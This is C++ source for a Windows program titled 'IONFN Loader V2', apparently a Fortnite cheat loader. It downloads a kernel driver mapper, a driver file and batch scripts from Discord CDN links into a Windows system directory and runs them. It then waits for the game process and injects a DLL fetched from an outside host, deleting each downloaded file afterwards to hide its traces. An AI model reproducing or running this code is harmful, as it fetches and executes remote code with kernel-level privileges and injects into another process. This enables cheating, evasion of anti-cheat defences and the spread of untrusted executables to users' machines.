#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

#pragma comment(lib, "urlmon.lib")

using namespace std;

DWORD GetProcessID(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}

int main()
{
	RECT Rect;
	HWND ConsoleWindow = GetConsoleWindow();
	auto a = GetWindowLongW(ConsoleWindow, 0xfffffff0);
	SetWindowLongW(ConsoleWindow, 0xfffffff0, a & 0xFFFAFFFF);
	GetWindowRect(ConsoleWindow, &Rect);
	MoveWindow(ConsoleWindow, Rect.left, Rect.bottom, 900, 500, true);

	system("cls");

	SetConsoleTitleA("IONFN Loader V2");

	HANDLE ConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	SetConsoleTextAttribute(ConsoleOutput, 4);

	cout << "[-] Loading Driver" << endl;
	cout << "[>] Status:" << endl;

	SetConsoleTextAttribute(ConsoleOutput, 5);

	URLDownloadToFileW(0, L"https://cdn.discordapp.com/attachments/748646124696502342/756996836308418730/kdmapper.exe", L"C:\\Windows\\apppatch\\Custom\\Custom64\\kdmapper.exe", 0, 0);
	URLDownloadToFileW(0, L"https://cdn.discordapp.com/attachments/748646124696502342/756990774620455002/driver.sys", L"C:\\Windows\\apppatch\\Custom\\Custom64\\driver.sys", 0, 0);
	URLDownloadToFileW(0, L"https://cdn.discordapp.com/attachments/748646124696502342/756990779456749639/Map.bat", L"C:\\Windows\\apppatch\\Custom\\Custom64\\Map.bat", 0, 0);

	system("C:\\Windows\\apppatch\\Custom\\Custom64\\Map.bat");

	Sleep(1500);

	remove("C:\\Windows\\apppatch\\Custom\\Custom64\\kdmapper.exe");
	remove("C:\\Windows\\apppatch\\Custom\\Custom64\\driver.sys");
	remove("C:\\Windows\\apppatch\\Custom\\Custom64\\Map.bat");
	system("cls");

	SetConsoleTextAttribute(ConsoleOutput, 5);

	cout << "\n\n\n\t   [+] Waiting for FortniteClient-Win64-Shipping.exe" << endl;
	cout << "           [+] By Problems open a Ticket by ION FN Discord Server! Cheat is updatet every day!" << endl;

	while (!GetProcessID(L"FortniteClient-Win64-Shipping.exe"))
		Sleep(10);

	cout << "\tProcess found!" << endl;
	cout << "\n\n\tF2 in lobby to Inject!" << endl;

	SetConsoleTextAttribute(ConsoleOutput, 4);

	while (!GetAsyncKeyState(VK_F2));

	cout << "[-] \nInjecting" << endl;

	URLDownloadToFileW(0, L"https://cdn.discordapp.com/attachments/748646124696502342/756990770359173161/modmap.exe", L"C:\\Windows\\apppatch\\Custom\\Custom64\\modmap.exe", 0, 0);
	URLDownloadToFileW(0, L"https://cdn.discordapp.com/attachments/748646124696502342/756990772863172729/Inject.bat", L"C:\\Windows\\apppatch\\Custom\\Custom64\\Inject.bat", 0, 0);
	URLDownloadToFileW(0, L"http://ion-fn.bplaced.net/dfgujighnjgfnh/Fortnite.dll", L"C:\\Windows\\apppatch\\Custom\\Custom64\\Fortnite.dll", 0, 0);
	
	system("C:\\Windows\\apppatch\\Custom\\Custom64\\Inject.bat");

	system("cls");

	Sleep(800);

	remove("C:\\Windows\\apppatch\\Custom\\Custom64\\modmap.exe");
	remove("C:\\Windows\\apppatch\\Custom\\Custom64\\Inject.bat");
	remove("C:\\Windows\\apppatch\\Custom\\Custom64\\Fortnite.dll");

	system("cls");

	SetConsoleTextAttribute(ConsoleOutput, 3);

	cout << "[i] Have fun with ION FN! Exiting in 5 seconds" << endl;

	Sleep(5000);

	exit(1);
}
